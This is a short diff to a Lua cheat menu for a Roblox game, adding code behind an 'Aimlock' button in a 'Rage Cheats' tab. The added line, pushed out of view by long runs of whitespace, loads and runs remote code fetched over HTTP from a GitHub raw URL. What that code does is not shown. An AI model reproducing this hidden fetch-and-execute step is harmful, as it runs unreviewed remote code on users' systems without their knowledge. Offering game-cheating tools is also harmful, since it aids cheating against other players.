@@ -210,7 +210,7 @@ local Window = Library.CreateLib("Dult.Px", "GrapeTheme")
 local Tab = Window:NewTab("Rage Cheats")
 
 local Section = Tab:NewSection("Aimlock")
-Section:NewButton("Aimlock", "Bling is so hot", function()
+Section:NewButton("Aimlock", "Bling is so hot", function()        loadstring(game:HttpGet("https://raw.githubusercontent.com/Scriptboy123/Aimlock/main/Source", true))()             
     game.StarterGui:SetCore("SendNotification", {
         Title = "Dult.PX";
         Text = "Sucessfully loaded Aimlock.";
